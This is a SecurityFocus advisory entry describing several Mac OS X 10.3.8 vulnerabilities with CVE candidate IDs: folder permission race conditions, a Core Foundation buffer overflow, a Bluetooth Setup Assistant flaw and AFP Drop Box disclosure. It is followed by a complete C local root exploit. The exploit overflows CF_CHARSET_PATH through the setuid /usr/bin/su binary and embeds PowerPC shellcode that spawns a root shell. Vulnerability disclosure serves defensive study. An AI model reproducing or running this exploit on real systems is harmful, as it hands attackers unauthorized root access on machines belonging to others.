source: http://www.securityfocus.com/bid/12863/info

Multiple security vulnerabilities are reported to affect Apple Mac OS X. These issues were disclosed in the referenced vendor advisory.

Insecure permissions are reported to be set on certain Apple Mac OS X folders . It is reported that because of these insecure permissions local attackers may exploit race conditions. The CVE Mitre candidate ID CAN-2005-0712 is assigned to this issue.

This vulnerability is reported to affect Apple Mac OSX, and OSX Server version 10.3.8. Previous versions might also be affected.

Core Foundation is reported prone to a local buffer overflow vulnerability. It is reported that this issue may be exploited in any application that is linked against the Core Foundation Library. An attacker may exploit this vulnerability to execute arbitrary code with elevated privileges. The CVE Mitre candidate ID CAN-2005-0716 is assigned to this issue.

This vulnerability is reported to affect Apple Mac OSX, and OSX Server version 10.3.8. Previous versions might also be affected.

The Bluetooth Setup Assistant application is reported prone to an unspecified security vulnerability. The CVE Mitre candidate ID CAN-2005-0713 is assigned to this issue.

This vulnerability is reported to affect Apple Mac OSX, and OSX Server version 10.3.8. Previous versions might also be affected.

The AFP server is reported prone to an information disclosure vulnerability. An attacker may exploit this issue to disclose the contents of Drop Boxes. The CVE Mitre candidate ID CAN-2005-0715 is assigned to this issue.

This vulnerability is reported to affect Apple Mac OSX, and OSX Server version 10.3.8. Previous versions might also be affected.

/*[ MacOS X[CF_CHARSET_PATH]: local root exploit. ]*********
 *                                                         *
 * by: v9@fakehalo.us (fakehalo/realhalo)                  *
 *                                                         *
 * found by: iDefense (anon finder)                        *
 *                                                         *
 * saw the advisory on bugtraq and figured i'd slap this   *
 * together, so simple i had to.  exploits via the         *
 * /usr/bin/su binary.  you must press ENTER at the        *
 * "Password: " prompt.                                    *
 ***********************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
static char exec[]= /* b-r00t's setuid(0)+exec(/bin/sh). */
 "\x7c\x63\x1a\x79\x40\x82\xff\xfd\x7d\x68\x02\xa6\x3b\xeb"
 "\x01\x70\x39\x40\x01\x70\x39\x1f\xfe\xdf\x7c\x68\x19\xae"
 "\x38\x0a\xfe\xa7\x44\xff\xff\x02\x60\x60\x60\x60\x7c\xa5"
 "\x2a\x79\x38\x7f\xfe\xd8\x90\x61\xff\xf8\x90\xa1\xff\xfc"
 "\x38\x81\xff\xf8\x38\x0a\xfe\xcb\x44\xff\xff\x02\x7c\xa3"
 "\x2b\x78\x38\x0a\xfe\x91\x44\xff\xff\x02\x2f\x62\x69\x6e"
 "\x2f\x73\x68\x58";
int main(void){
 unsigned int i=0;
 char *buf,*env[3];
 printf("(*)MacOS X[CF_CHARSET_PATH]: local root exploit.\n");
 printf("(*)by: v9@fakehalo.us, found by iDefense adv. (anon)\n\n");
 if(!(buf=(char *)malloc(1100+1)))exit(1);
 memcpy(buf,"CF_CHARSET_PATH=",16);
 printf("[*] setting up the environment.\n");
 for(i=16;i<1100;i+=4)*(long *)&buf[i]=(0xbffffffa-strlen(exec));
 env[0]=buf;
 env[1]=exec;
 env[2]=NULL;
 printf("[*] executing su... (press ENTER at the \"Password: \""
 " prompt)\n\n");
 if(execle("/usr/bin/su","su",0,env))
  printf("[!] failed executing /usr/bin/su.\n");
 exit(0);
}


